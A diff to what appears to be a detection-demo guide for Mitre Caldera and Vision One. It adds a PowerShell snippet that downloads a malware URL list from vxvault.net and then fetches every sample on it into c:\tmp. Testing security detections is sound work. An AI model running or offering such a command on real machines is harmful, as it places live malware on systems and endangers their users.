@@ -79,6 +79,11 @@ Using Mitre Caldera, you can deploy the Techniques "Crypto (Monero) Mining (T149
 #### Impact 2
 Under development..
 
+        New-Item -Path c:\tmp -ItemType Directory;
+        Invoke-WebRequest http://vxvault.net/URL_List.php -OutFile c:\tmp\urls.txt;
+        Set-Location -Path c:\tmp;
+        foreach($line in Get-Content c:\tmp\urls.txt) {Invoke-WebRequest -Uri $line -OutFile $(Split-Path -Path $line -Leaf)}
+
 ---
 ## Reviewing the Detections 
 Review your Vision One Portal (Risk Insights and XDR / Workbenchs and OAT) searching for the evidences of the instructions executed during this demo.
